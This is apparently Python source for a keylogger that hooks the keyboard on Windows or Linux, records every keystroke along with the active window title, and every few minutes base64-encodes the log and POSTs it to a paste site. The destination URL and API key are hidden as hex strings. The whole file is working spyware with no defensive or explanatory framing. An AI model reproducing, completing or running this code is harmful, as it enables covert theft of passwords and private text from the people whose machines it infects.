import time, os, sys
from multiprocessing import Process, Queue
from threading import Thread
from base64 import b64encode
from requests import request
if os.name is 'nt':
    from pyHook import HookManager
    from pythoncom import PumpMessages
else:
    from pyxhook import HookManager


class Keylogger(Process):
    def __init__(self):
        super(Keylogger, self).__init__()
        self.name               = __name__
        self.temporary_buffer   = bytes()
        self.current_window     = None
        self.next_upload        = 30.0
        self.results            = Queue()

    def onEvent(self, event):
        try:
            if event.WindowName != self.current_window:
                self.current_window = event.WindowName
                self.temporary_buffer += "\n\n[{}]\n\n".format(self.current_window)
            if event.Ascii > 32 and event.Ascii < 127:
                self.temporary_buffer += chr(event.Ascii)
            elif event.Ascii == 32:
                self.temporary_buffer += ' '
            elif event.Ascii in (10,13):
                self.temporary_buffer += ('\n')
            elif event.Ascii == 8:
                self.temporary_buffer = self.temporary_buffer[:-1]
            else:
                pass
        except Exception as e:
            self.temporary_buffer += "Keylogging error: '{}'".format(str(e), str(event))
        return True

    def manager(self, authkey=None):
        while True:
            while time.clock() < self.next_upload:
                time.sleep(10)
            if authkey:
                output = request('POST', '68747470733a2f2f706173746562696e2e636f6d2f6170692f6170695f706f73742e706870'.decode('hex'), data={ 'api_dev_key': authkey.decode('hex'), 'api_option': 'paste', 'api_paste_code': b64encode(self.temporary_buffer) }).content
            else:
                output = self.temporary_buffer
            result = { 'msg': output, 'name':self.name }
            self.results.put(result)
            self.temporary_buffer = ''
            self.next_upload += 300.0

    def run(self, authkey='6461663335306636383761393466303739613834383261303436323634313233'):
        t = Thread(target=self.manager, kwargs={'authkey': authkey})
        t.start()
        while True:
            kl = HookManager()
            kl.KeyDown = self.onEvent
            kl.HookKeyboard()
            PumpMessages()



if __name__ == '__main__':
    module = Keylogger()
    module.run()
